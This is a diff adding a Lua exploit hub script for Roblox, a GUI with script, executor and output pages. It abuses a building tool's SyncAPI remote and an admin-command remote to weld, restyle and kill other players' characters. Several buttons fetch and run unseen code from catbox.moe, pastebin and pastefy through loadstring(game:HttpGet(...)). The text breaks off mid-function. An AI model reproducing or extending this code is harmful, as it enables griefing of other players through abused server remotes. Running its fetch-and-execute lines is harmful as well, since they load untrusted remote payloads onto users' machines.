+        
+        local attachment0 = root:FindFirstChild("Attachment") or Instance.new("Attachment", root)
+        local attachment1 = targetRoot:FindFirstChild("Attachment") or Instance.new("Attachment", targetRoot)
+
+   
+        alignPosition = Instance.new("AlignPosition")
+        alignPosition.MaxForce = 1000000
+        alignPosition.Responsiveness = 200
+        alignPosition.Attachment0 = attachment0
+        alignPosition.Attachment1 = attachment1
+        alignPosition.Parent = root
+        alignOrientation = Instance.new("AlignOrientation")
+        alignOrientation.MaxTorque = 1000000
+        alignOrientation.Responsiveness = 200
+        alignOrientation.Attachment0 = attachment0
+        alignOrientation.Attachment1 = attachment1
+        alignOrientation.Parent = root
+
+     
+        attachment1.Position = Vector3.new(0, 0, 0.5)
+    end
+end
+
+local function detach()
+    if alignPosition then
+        alignPosition:Destroy()
+        alignPosition = nil
+    end
+    if alignOrientation then
+        alignOrientation:Destroy()
+        alignOrientation = nil
+    end
+end
+
+local function attacke()
+    if isBusy then return end
+    isBusy = true
+
+    local hitPlayer = nil
+local touchedConnection
+
+local function onTouch(other)
+    local otherPlayer = Players:GetPlayerFromCharacter(other.Parent)
+    if otherPlayer and otherPlayer ~= player then
+        hitPlayer = otherPlayer
+    end
+end
+
+touchedConnection = arm.Touched:Connect(onTouch)
+task.wait(0.15)
+if touchedConnection then
+    touchedConnection:Disconnect()
+end
+
+    if hitPlayer and hitPlayer.Character then
+        
+RequestCommand:InvokeServer(";speed " ..hitPlayer.Name.. " 0")
+ 
+        
+				track1.Looped = false
+				track2.Looped = false
+				holdTrack.Looped = false
+
+				track1:Play()
+				track1.Stopped:Wait()
+
+				track2:Play()
+        track2:AdjustSpeed(3)
+				track2.Stopped:Wait()
+
+				holdTrack:Play()
+        
+				holdTrack:AdjustSpeed(0)
+spawn(function()
+attachBehind(hitPlayer.Character)
+wait(0.8)
+detach()
+end)
+spawn(function()
+SetLocked(hitPlayer.Character.Torso, false)
+end)
+spawn(function()
+SetLocked(char.Torso, false)
+end)
+ Weld(character.Torso,hitPlayer.Character.Torso,character.Torso)
+Weld(character.Torso,hitPlayer.Character.HumanoidRootPart,character.Torso)
+Weld(character.Torso,hitPlayer.Character.Head,character.Torso)
+
+
+wait(3)
+            spawn(function()
+            Kill()
+            end)
+            bleed(hitPlayer)
+            wait(0.5)
+           RequestCommand:InvokeServer(";kill " ..hitPlayer.Name)
+           wait(0.5)
+breakWelds(character.Torso)
+breakWelds(hitPlayer.Character.Torso)
+spawn(function()
+wait(0.8)
+
+spawn(function()
+SetLocked(hitPlayer.Character.Torso, false)
+end)
+spawn(function()
+SetLocked(hitPlayer.Character["Right Arm"], false)
+end)
+spawn(function()
+SetLocked(hitPlayer.Character["Left Arm"], false)
+end)
+spawn(function()
+SetLocked(hitPlayer.Character["Right Leg"], false)
+end)
+spawn(function()
+SetLocked(hitPlayer.Character["Left Leg"], false)
+end)
+
+spawn(function()
+SetCollision(hitPlayer.Character.Torso, true)
+end)
+spawn(function()
+SetCollision(hitPlayer.Character["Right Arm"], true)
+end)
+spawn(function()
+SetCollision(hitPlayer.Character["Left Arm"], true)
+end)
+spawn(function()
+SetCollision(hitPlayer.Character["Right Leg"], true)
+end)
+spawn(function()
+SetCollision(hitPlayer.Character["Left Leg"], true)
+end)
+end)
+
+wait(0.3)
+           
+            
+            isBusy = false
+  
+
+    else
+        
+        failed()
+        wait(0.4)
+            isBusy = false
+    end
+end
+
+
+
+
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+ if gameProcessed then return end
+
+ if input.KeyCode == Enum.KeyCode.Z then
+  local args = {
+  "Remove",
+  {
+   knfe.Handle
+  }
+ }
+ _(args)
+ knfe:Destroy()
+
+ RequestCommand:InvokeServer(";hat me 18420472059")
+ wait(1)
+ local knife = character:FindFirstChild("Accessory (KNIF4ELERFTAccessory)")
+
+ spawn(function()
+ local args = {
+  "Remove",
+  {
+   knife.Handle.SpecialMesh
+  }
+ }
+ _(args)
+ end)
+
+ spawn(function()
+ AddMesh(knife.Handle)
+ end)
+ spawn(function()
+ SetMesh(knife.Handle, "18114736783", Vector3.new(0, 0,-0.25))
+ end)
+ spawn(function()
+ SetTexture(knife.Handle, "80617091791234")
+ end)
+
+ ready = true
+ end 
+end)
+
+
+
+
+UserInputService.TouchTap:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+if ready == true then
+    attacke()
+end
+end)
+
+end
+end)
+
+uzi.Name = "uzi"
+uzi.Parent = scriptspage
+uzi.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+uzi.BorderColor3 = Color3.fromRGB(129, 26, 255)
+uzi.BorderSizePixel = 2
+uzi.Position = UDim2.new(0.512035012, 0, 0.666919887, 0)
+uzi.Size = UDim2.new(0, 104, 0, 29)
+uzi.Font = Enum.Font.Arial
+uzi.Text = "Uzi Gun"
+uzi.TextColor3 = Color3.fromRGB(255, 255, 255)
+uzi.TextSize = 18.000
+uzi.TextWrapped = true
+uzi.MouseButton1Click:Connect(function()
+rq:InvokeServer(";shirt me 1313573671")
+rq:InvokeServer(";pants me 6458756358")
+loadstring(game:HttpGet("https://files.catbox.moe/o5iwhr.txt"))()
+end)
+
+guns.Name = "guns"
+guns.Parent = scriptspage
+guns.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+guns.BorderColor3 = Color3.fromRGB(129, 26, 255)
+guns.BorderSizePixel = 2
+guns.Position = UDim2.new(0.752735257, 0, 0.666919887, 0)
+guns.Size = UDim2.new(0, 99, 0, 29)
+guns.Font = Enum.Font.Arial
+guns.Text = "Thomas"
+guns.TextColor3 = Color3.fromRGB(255, 255, 255)
+guns.TextSize = 18.000
+guns.TextWrapped = true
+guns.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/jDpU45cz"))()
+end)
+
+stra.Name = "stra"
+stra.Parent = scriptspage
+stra.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+stra.BorderColor3 = Color3.fromRGB(129, 26, 255)
+stra.BorderSizePixel = 2
+stra.Position = UDim2.new(0.0306345727, 0, 0.791033387, 0)
+stra.Size = UDim2.new(0, 104, 0, 29)
+stra.Font = Enum.Font.Arial
+stra.Text = "Shedletskify"
+stra.TextColor3 = Color3.fromRGB(255, 255, 255)
+stra.TextSize = 18.000
+stra.TextWrapped = true
+stra.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/UQ8B34oY/raw"))()
+end)
+
+k0p.Name = "k0p"
+k0p.Parent = scriptspage
+k0p.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+k0p.BorderColor3 = Color3.fromRGB(129, 26, 255)
+k0p.BorderSizePixel = 2
+k0p.Position = UDim2.new(0.271334797, 0, 0.791033387, 0)
+k0p.Size = UDim2.new(0, 104, 0, 29)
+k0p.Font = Enum.Font.Arial
+k0p.Text = "K**P V11"
+k0p.TextColor3 = Color3.fromRGB(255, 255, 255)
+k0p.TextSize = 18.000
+k0p.TextWrapped = true
+k0p.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://files.catbox.moe/zj8l0y.txt"))()
+end)
+
+infiniteyield.Name = "infinite yield"
+infiniteyield.Parent = scriptspage
+infiniteyield.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+infiniteyield.BorderColor3 = Color3.fromRGB(129, 26, 255)
+infiniteyield.BorderSizePixel = 2
+infiniteyield.Position = UDim2.new(0.512035012, 0, 0.791033387, 0)
+infiniteyield.Size = UDim2.new(0, 104, 0, 29)
+infiniteyield.Font = Enum.Font.Arial
+infiniteyield.Text = "INF YIELD"
+infiniteyield.TextColor3 = Color3.fromRGB(255, 255, 255)
+infiniteyield.TextSize = 18.000
+infiniteyield.TextWrapped = true
+
+exser.Name = "exser"
+exser.Parent = scriptspage
+exser.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+exser.BorderColor3 = Color3.fromRGB(129, 26, 255)
+exser.BorderSizePixel = 2
+exser.Position = UDim2.new(0.752735257, 0, 0.791033387, 0)
+exser.Size = UDim2.new(0, 99, 0, 29)
+exser.Font = Enum.Font.Arial
+exser.Text = "ExSer"
+exser.TextColor3 = Color3.fromRGB(255, 255, 255)
+exser.TextSize = 18.000
+exser.TextWrapped = true
+exser.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/7sO8ckTL/raw"))()
+end)
+
+nextpage.Name = "nextpage"
+nextpage.Parent = scriptspage
+nextpage.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+nextpage.BorderColor3 = Color3.fromRGB(129, 26, 255)
+nextpage.BorderSizePixel = 2
+nextpage.Position = UDim2.new(0.463894963, 0, 0.922239065, 0)
+nextpage.Size = UDim2.new(0, 34, 0, 15)
+nextpage.Font = Enum.Font.Arial
+nextpage.Text = ">"
+nextpage.TextColor3 = Color3.fromRGB(255, 255, 255)
+nextpage.TextSize = 18.000
+nextpage.TextWrapped = true
+
+Executor.Name = "Executor"
+Executor.Parent = Holder
+Executor.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Executor.BorderColor3 = Color3.fromRGB(129, 26, 255)
+Executor.BorderSizePixel = 2
+Executor.Position = UDim2.new(0.654266953, 0, 0, 0)
+Executor.Size = UDim2.new(0, 79, 0, 29)
+Executor.Font = Enum.Font.Arial
+Executor.Text = "Executor"
+Executor.TextColor3 = Color3.fromRGB(255, 255, 255)
+Executor.TextSize = 18.000
+Executor.TextWrapped = true
+
+executorpage.Name = "executorpage"
+executorpage.Parent = Holder
+executorpage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+executorpage.BackgroundTransparency = 1.000
+executorpage.BorderColor3 = Color3.fromRGB(0, 0, 0)
+executorpage.BorderSizePixel = 0
+executorpage.Position = UDim2.new(0, 0, 0.093247585, 0)
+executorpage.Size = UDim2.new(0, 457, 0, 282)
+executorpage.Visible = false
+
+input.Name = "input"
+input.Parent = executorpage
+input.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+input.BorderColor3 = Color3.fromRGB(129, 26, 255)
+input.BorderSizePixel = 2
+input.Position = UDim2.new(0.0153172864, 0, 0.0319148935, 0)
+input.Size = UDim2.new(0, 444, 0, 218)
+input.ClearTextOnFocus = false
+input.Font = Enum.Font.Code
+input.MultiLine = true
+input.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
+input.PlaceholderText = "--[\n         Made by Alif\n--["
+input.Text = ""
+input.TextColor3 = Color3.fromRGB(17, 255, 0)
+input.TextSize = 14.000
+input.TextXAlignment = Enum.TextXAlignment.Left
+input.TextYAlignment = Enum.TextYAlignment.Top
+
+exec.Name = "exec"
+exec.Parent = executorpage
+exec.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+exec.BorderColor3 = Color3.fromRGB(129, 26, 255)
+exec.BorderSizePixel = 2
+exec.Position = UDim2.new(0.0153172864, 0, 0.847770989, 0)
+exec.Size = UDim2.new(0, 104, 0, 33)
+exec.Font = Enum.Font.Arial
+exec.Text = "Execute"
+exec.TextColor3 = Color3.fromRGB(255, 255, 255)
+exec.TextSize = 18.000
+exec.TextWrapped = true
+
+clear.Name = "clear"
+clear.Parent = executorpage
+clear.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+clear.BorderColor3 = Color3.fromRGB(129, 26, 255)
+clear.BorderSizePixel = 2
+clear.Position = UDim2.new(0.260393888, 0, 0.847770989, 0)
+clear.Size = UDim2.new(0, 104, 0, 33)
+clear.Font = Enum.Font.Arial
+clear.Text = "Clear"
+clear.TextColor3 = Color3.fromRGB(255, 255, 255)
+clear.TextSize = 18.000
+clear.TextWrapped = true
+
+hey.Name = "hey"
+hey.Parent = executorpage
+hey.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+hey.BackgroundTransparency = 1.000
+hey.BorderColor3 = Color3.fromRGB(0, 0, 0)
+hey.BorderSizePixel = 0
+hey.Position = UDim2.new(0.51859957, 0, 0.847770989, 0)
+hey.Size = UDim2.new(0, 100, 0, 32)
+hey.Font = Enum.Font.Arial
+hey.Text = "Execute on :"
+hey.TextColor3 = Color3.fromRGB(255, 255, 255)
+hey.TextSize = 18.000
+hey.TextXAlignment = Enum.TextXAlignment.Left
+
+idk.Name = "idk"
+idk.Parent = executorpage
+idk.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+idk.BackgroundTransparency = 1.000
+idk.BorderColor3 = Color3.fromRGB(0, 0, 0)
+idk.BorderSizePixel = 0
+idk.Position = UDim2.new(0.737417936, 0, 0.847770989, 0)
+idk.Size = UDim2.new(0, 100, 0, 32)
+idk.Font = Enum.Font.Arial
+idk.Text = "Sever"
+idk.TextColor3 = Color3.fromRGB(98, 255, 0)
+idk.TextSize = 18.000
+idk.TextXAlignment = Enum.TextXAlignment.Left
+
+Output.Name = "Output"
+Output.Parent = Holder
+Output.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Output.BorderColor3 = Color3.fromRGB(129, 26, 255)
+Output.BorderSizePixel = 2
+Output.Position = UDim2.new(0.827133477, 0, 0, 0)
+Output.Size = UDim2.new(0, 79, 0, 29)
+Output.Font = Enum.Font.Arial
+Output.Text = "Output"
+Output.TextColor3 = Color3.fromRGB(255, 255, 255)
+Output.TextSize = 18.000
+Output.TextWrapped = true
+
+outputpage.Name = "outputpage"
+outputpage.Parent = Holder
+outputpage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+outputpage.BackgroundTransparency = 1.000
+outputpage.BorderColor3 = Color3.fromRGB(129, 26, 255)
+outputpage.BorderSizePixel = 2
+outputpage.Position = UDim2.new(0, 0, 0.093247585, 0)
+outputpage.Size = UDim2.new(0, 457, 0, 282)
+outputpage.Visible = false
+
+MainComponent.Name = "MainComponent"
+MainComponent.Parent = outputpage
+MainComponent.Active = true
+MainComponent.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+MainComponent.BorderColor3 = Color3.fromRGB(129, 26, 255)
+MainComponent.BorderSizePixel = 2
+MainComponent.Position = UDim2.new(0.0218818374, 0, 0.0177304968, 0)
+MainComponent.Size = UDim2.new(0, 439, 0, 220)
+MainComponent.CanvasSize = UDim2.new(0, 0, 8, 0)
+
+output.Name = "output"
+output.Parent = MainComponent
+output.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+output.BorderColor3 = Color3.fromRGB(0, 0, 0)
+output.BorderSizePixel = 0
+output.Size = UDim2.new(0, 439, 0, 9999999)
+output.ClearTextOnFocus = false
+output.Font = Enum.Font.Code
+output.MultiLine = true
+output.Text = "\n"
+output.TextColor3 = Color3.fromRGB(255, 255, 255)
+output.TextSize = 16.000
+output.TextWrapped = true
+output.TextXAlignment = Enum.TextXAlignment.Left
+output.TextYAlignment = Enum.TextYAlignment.Top
+
+clear_2.Name = "clear"
+clear_2.Parent = outputpage
+clear_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+clear_2.BorderColor3 = Color3.fromRGB(129, 26, 255)
+clear_2.BorderSizePixel = 2
+clear_2.Position = UDim2.new(0.256017506, 0, 0.851063848, 0)
+clear_2.Size = UDim2.new(0, 219, 0, 29)
+clear_2.Font = Enum.Font.Arial
+clear_2.Text = "Clear"
+clear_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+clear_2.TextSize = 18.000
+clear_2.TextWrapped = true
+
+homepage.Name = "homepage"
+homepage.Parent = Holder
+homepage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+homepage.BackgroundTransparency = 1.000
+homepage.BorderColor3 = Color3.fromRGB(0, 0, 0)
+homepage.BorderSizePixel = 0
+homepage.Position = UDim2.new(0, 0, 0.0996784568, 0)
+homepage.Size = UDim2.new(0, 457, 0, 280)
+
+br.Name = "br"
+br.Parent = homepage
+br.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+br.BackgroundTransparency = 1.000
+br.BorderColor3 = Color3.fromRGB(0, 0, 0)
+br.BorderSizePixel = 0
+br.Position = UDim2.new(0.249452949, 0, 0.0500000007, 0)
+br.Size = UDim2.new(0, 96, 0, 29)
+br.Font = Enum.Font.Arial
+br.Text = "Username :"
+br.TextColor3 = Color3.fromRGB(255, 255, 255)
+br.TextSize = 18.000
+br.TextXAlignment = Enum.TextXAlignment.Left
+
+user.Name = "user"
+user.Parent = homepage
+user.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+user.BackgroundTransparency = 1.000
+user.BorderColor3 = Color3.fromRGB(0, 0, 0)
+user.BorderSizePixel = 0
+user.Position = UDim2.new(0.459518611, 0, 0.0500000007, 0)
+user.Size = UDim2.new(0, 96, 0, 29)
+user.Font = Enum.Font.Arial
+user.Text = "Verifying..."
+user.TextColor3 = Color3.fromRGB(255, 255, 255)
+user.TextSize = 18.000
+user.TextXAlignment = Enum.TextXAlignment.Left
+
+br2.Name = "br2"
+br2.Parent = homepage
+br2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+br2.BackgroundTransparency = 1.000
+br2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+br2.BorderSizePixel = 0
+br2.Position = UDim2.new(0.249452949, 0, 0.153571427, 0)
+br2.Size = UDim2.new(0, 96, 0, 29)
+br2.Font = Enum.Font.Arial
+br2.Text = "Age Days :"
+br2.TextColor3 = Color3.fromRGB(255, 255, 255)
+br2.TextSize = 18.000
+br2.TextXAlignment = Enum.TextXAlignment.Left
+
+age.Name = "age"
+age.Parent = homepage
+age.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+age.BackgroundTransparency = 1.000
+age.BorderColor3 = Color3.fromRGB(0, 0, 0)
+age.BorderSizePixel = 0
+age.Position = UDim2.new(0.459518611, 0, 0.153571427, 0)
+age.Size = UDim2.new(0, 96, 0, 29)
+age.Font = Enum.Font.Arial
+age.Text = "Verifying..."
+age.TextColor3 = Color3.fromRGB(255, 255, 255)
+age.TextSize = 18.000
+age.TextXAlignment = Enum.TextXAlignment.Left
+
+br3.Name = "br3"
+br3.Parent = homepage
+br3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+br3.BackgroundTransparency = 1.000
+br3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+br3.BorderSizePixel = 0
+br3.Position = UDim2.new(0.249452949, 0, 0.257142872, 0)
+br3.Size = UDim2.new(0, 96, 0, 29)
+br3.Font = Enum.Font.Arial
+br3.Text = "FE :"
+br3.TextColor3 = Color3.fromRGB(255, 255, 255)
+br3.TextSize = 18.000
+br3.TextXAlignment = Enum.TextXAlignment.Left
+
+f.Name = "f"
+f.Parent = homepage
+f.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+f.BackgroundTransparency = 1.000
+f.BorderColor3 = Color3.fromRGB(0, 0, 0)
+f.BorderSizePixel = 0
+f.Position = UDim2.new(0.334792137, 0, 0.257142872, 0)
+f.Size = UDim2.new(0, 96, 0, 29)
+f.Font = Enum.Font.Arial
+f.Text = "Enabled!"
+f.TextColor3 = Color3.fromRGB(255, 255, 255)
+f.TextSize = 18.000
+f.TextXAlignment = Enum.TextXAlignment.Left
+
+user_2.Name = "user"
+user_2.Parent = homepage
+user_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+user_2.BackgroundTransparency = 1.000
+user_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+user_2.BorderSizePixel = 0
+user_2.Position = UDim2.new(0.0153172864, 0, 0.0714285746, 0)
+user_2.Size = UDim2.new(0, 100, 0, 100)
+user_2.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+
+svrtime.Name = "svrtime"
+svrtime.Parent = homepage
+svrtime.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+svrtime.BackgroundTransparency = 1.000
+svrtime.BorderColor3 = Color3.fromRGB(0, 0, 0)
+svrtime.BorderSizePixel = 0
+svrtime.Position = UDim2.new(0.0153172864, 0, 0.460714281, 0)
+svrtime.Size = UDim2.new(0, 96, 0, 29)
+svrtime.Font = Enum.Font.Arial
+svrtime.Text = "Server Time: Verifying..."
+svrtime.TextColor3 = Color3.fromRGB(255, 255, 255)
+svrtime.TextSize = 18.000
+svrtime.TextXAlignment = Enum.TextXAlignment.Left
+
+realtime.Name = "realtime"
+realtime.Parent = homepage
+realtime.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+realtime.BackgroundTransparency = 1.000
+realtime.BorderColor3 = Color3.fromRGB(0, 0, 0)
+realtime.BorderSizePixel = 0
+realtime.Position = UDim2.new(0.0153172864, 0, 0.564285696, 0)
+realtime.Size = UDim2.new(0, 96, 0, 29)
+realtime.Font = Enum.Font.Arial
+realtime.Text = "Time: Verifying..."
+realtime.TextColor3 = Color3.fromRGB(255, 255, 255)
+realtime.TextSize = 18.000
+realtime.TextXAlignment = Enum.TextXAlignment.Left
+
+jobid.Name = "jobid"
+jobid.Parent = homepage
+jobid.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+jobid.BackgroundTransparency = 1.000
+jobid.BorderColor3 = Color3.fromRGB(0, 0, 0)
+jobid.BorderSizePixel = 0
+jobid.Position = UDim2.new(0.0153172864, 0, 0.66785717, 0)
+jobid.Size = UDim2.new(0, 96, 0, 29)
+jobid.Font = Enum.Font.Arial
+jobid.Text = "Job ID: Verifying..."
+jobid.TextColor3 = Color3.fromRGB(255, 255, 255)
+jobid.TextSize = 18.000
+jobid.TextXAlignment = Enum.TextXAlignment.Left
+
+placeid.Name = "placeid"
+placeid.Parent = homepage
+placeid.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+placeid.BackgroundTransparency = 1.000
+placeid.BorderColor3 = Color3.fromRGB(0, 0, 0)
+placeid.BorderSizePixel = 0
+placeid.Position = UDim2.new(0.0153172864, 0, 0.771428585, 0)
+placeid.Size = UDim2.new(0, 96, 0, 29)
+placeid.Font = Enum.Font.Arial
+placeid.Text = "Place ID: Verifying..."
+placeid.TextColor3 = Color3.fromRGB(255, 255, 255)
+placeid.TextSize = 18.000
+placeid.TextXAlignment = Enum.TextXAlignment.Left
+local MarketplaceService = game:GetService("MarketplaceService")
+
+local placeId = game.PlaceId
+local gameName = "Game Name Not Found"
+
+pcall(function()
+	local info = MarketplaceService:GetProductInfo(placeId)
+	gameName = info.Name
+end)
+
+placeid.Text = "Place ID: " .. placeId .. " (" .. gameName .. ")"
+
+
+idk_2.Name = "idk"
+idk_2.Parent = homepage
+idk_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+idk_2.BackgroundTransparency = 1.000
+idk_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+idk_2.BorderSizePixel = 0
+idk_2.Position = UDim2.new(0.0153172864, 0, 0.875, 0)
+idk_2.Size = UDim2.new(0, 96, 0, 29)
+idk_2.Font = Enum.Font.Arial
+idk_2.Text = "Country: us"
+idk_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+idk_2.TextSize = 18.000
+idk_2.TextXAlignment = Enum.TextXAlignment.Left
+
+progress.Name = "progress"
+progress.Parent = homepage
+progress.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+progress.BackgroundTransparency = 1.000
+progress.BorderColor3 = Color3.fromRGB(0, 0, 0)
+progress.BorderSizePixel = 0
+progress.Position = UDim2.new(0.251148582, 0, 0.344999909, 0)
+progress.Size = UDim2.new(0, 334, 0, 31)
+progress.Font = Enum.Font.Arial
+progress.Text = "Success! You are now be able to use."
+progress.TextColor3 = Color3.fromRGB(255, 255, 255)
+progress.TextSize = 18.000
+progress.TextWrapped = true
+progress.TextXAlignment = Enum.TextXAlignment.Left
+
+scriptspage3.Name = "scriptspage3"
+scriptspage3.Parent = Holder
+scriptspage3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+scriptspage3.BackgroundTransparency = 1.000
+scriptspage3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+scriptspage3.BorderSizePixel = 0
+scriptspage3.Position = UDim2.new(0, 0, 0.093247585, 0)
+scriptspage3.Size = UDim2.new(0, 457, 0, 282)
+scriptspage3.Visible = false
+
+nextpage_2.Name = "nextpage"
+nextpage_2.Parent = scriptspage3
+nextpage_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+nextpage_2.BorderColor3 = Color3.fromRGB(129, 26, 255)
+nextpage_2.BorderSizePixel = 2
+nextpage_2.Position = UDim2.new(0.463894963, 0, 0.922239065, 0)
+nextpage_2.Size = UDim2.new(0, 34, 0, 15)
+nextpage_2.Font = Enum.Font.Arial
+nextpage_2.Text = "<"
+nextpage_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+nextpage_2.TextSize = 18.000
+nextpage_2.TextWrapped = true
+
+scriptspage2.Name = "scriptspage2"
+scriptspage2.Parent = Holder
+scriptspage2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+scriptspage2.BackgroundTransparency = 1.000
+scriptspage2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+scriptspage2.BorderSizePixel = 0
+scriptspage2.Position = UDim2.new(0, 0, 0.0996784568, 0)
+scriptspage2.Size = UDim2.new(0, 457, 0, 280)
+scriptspage2.Visible = false
+
+omni.Name = "omni"
+omni.Parent = scriptspage2
+omni.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+omni.BorderColor3 = Color3.fromRGB(129, 26, 255)
+omni.BorderSizePixel = 2
+omni.Position = UDim2.new(0.0306345727, 0, 0.0357142873, 0)
+omni.Size = UDim2.new(0, 104, 0, 29)
+omni.Font = Enum.Font.Arial
+omni.Text = "God"
+omni.TextColor3 = Color3.fromRGB(255, 255, 255)
+omni.TextScaled = true
+omni.TextSize = 18.000
+omni.TextWrapped = true
+omni.MouseButton1Click:Connect(function()
+rq:InvokeServer(";god")
+end)
+
+destructiong.Name = "destruction g"
+destructiong.Parent = scriptspage2
+destructiong.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+destructiong.BorderColor3 = Color3.fromRGB(129, 26, 255)
+destructiong.BorderSizePixel = 2
+destructiong.Position = UDim2.new(0.271334797, 0, 0.0357142873, 0)
+destructiong.Size = UDim2.new(0, 104, 0, 29)
+destructiong.Font = Enum.Font.Arial
+destructiong.Text = "Destruction"
+destructiong.TextColor3 = Color3.fromRGB(255, 255, 255)
+destructiong.TextScaled = true
+destructiong.TextSize = 18.000
+destructiong.TextWrapped = true
+destructiong.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/psSFNsX2/raw"))()
+end)
+
+IDE.Name = "IDE"
+IDE.Parent = scriptspage2
+IDE.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+IDE.BorderColor3 = Color3.fromRGB(129, 26, 255)
+IDE.BorderSizePixel = 2
+IDE.Position = UDim2.new(0.752735257, 0, 0.793692887, 0)
+IDE.Size = UDim2.new(0, 99, 0, 29)
+IDE.Font = Enum.Font.Arial
+IDE.Text = "Dominant Executor"
+IDE.TextColor3 = Color3.fromRGB(255, 255, 255)
+IDE.TextScaled = true
+IDE.TextSize = 18.000
+IDE.TextWrapped = true
+IDE.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/6nzH6Nx0"))()
+end)
+
+mystic.Name = "mystic"
+mystic.Parent = scriptspage2
+mystic.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+mystic.BorderColor3 = Color3.fromRGB(129, 26, 255)
+mystic.BorderSizePixel = 2
+mystic.Position = UDim2.new(0.512035012, 0, 0.0357142873, 0)
+mystic.Size = UDim2.new(0, 104, 0, 29)
+mystic.Font = Enum.Font.Arial
+mystic.Text = "John Doe"
+mystic.TextColor3 = Color3.fromRGB(255, 255, 255)
+mystic.TextScaled = true
+mystic.TextSize = 18.000
+mystic.TextWrapped = true
+mystic.MouseButton1Click:Connect(function()
+local player = game.Players.LocalPlayer
+    local char = player.Character
+    local tool
+    for i,v in player:GetDescendants() do
+        if v.Name == "SyncAPI" then
+            tool = v.Parent
+        end
+    end
+    for i,v in game.ReplicatedStorage:GetDescendants() do
+        if v.Name == "SyncAPI" then
+            tool = v.Parent
+        end
+    end
+   
+    remote = tool.SyncAPI.ServerEndpoint
+    function _(args)
+        remote:InvokeServer(unpack(args))
+    end
+
+
+local function Color(part, color)
+	local args = {
+		"SyncColor",
+		{
+			{
+				Part = part,
+				Color = color,
+				UnionColoring = false
+			}
+		}
+	}
+	_(args)
+end
+
+local function applyDecorationToPart(part) 
+    
+    local argsCreate = {
+        [1] = "CreateDecorations",
+        [2] = {
+            [1] = {
+                ["Part"] = part,
+                ["DecorationType"] = "Fire"
+            }
+        }
+    }
+
+   
+    local argsSync = {
+        [1] = "SyncDecorate",
+        [2] = {
+            [1] = {
+                ["Part"] = part,
+                ["DecorationType"] = "Fire",
+                ["Size"] = 3,
+                ["Heat"] = 25,
+                ["Color"] = Color3.fromRGB(255, 0, 0), 
+                ["SecondaryColor"] = Color3.fromRGB(255, 0, 0) 
+            } 
+        } 
+    }
+
+    
+    _(argsCreate)
+    _(argsSync)
+end
+
+local function Parter(part) 
+    
+    local argsCreate = {
+        [1] = "CreateDecorations",
+        [2] = {
+            [1] = {
+                ["Part"] = part,
+                ["DecorationType"] = "Smoke"
+            }
+        }
+    }
+
+   
+    local argsSync = {
+        [1] = "SyncDecorate",
+        [2] = {
+            [1] = {
+                ["Part"] = part,
+                ["DecorationType"] = "Smoke",
+                ["Size"] = 3,
+                ["Color"] = Color3.fromRGB(255, 0, 0),  
+            } 
+        } 
+    }
+
+    
+    _(argsCreate)
+    _(argsSync)
+end
+local function eyePart(part) 
+    
+    local argsCreate = {
+        [1] = "CreateDecorations",
+        [2] = {
+            [1] = {
+                ["Part"] = part,
+                ["DecorationType"] = "Fire"
+            }
+        }
+    }
+
+   
+    local argsSync = {
+        [1] = "SyncDecorate",
+        [2] = {
+            [1] = {
+                ["Part"] = part,
+                ["DecorationType"] = "Fire",
+                ["Size"] = 1,
+                ["Heat"] = 12,
+                ["Color"] = Color3.fromRGB(155, 0, 0), 
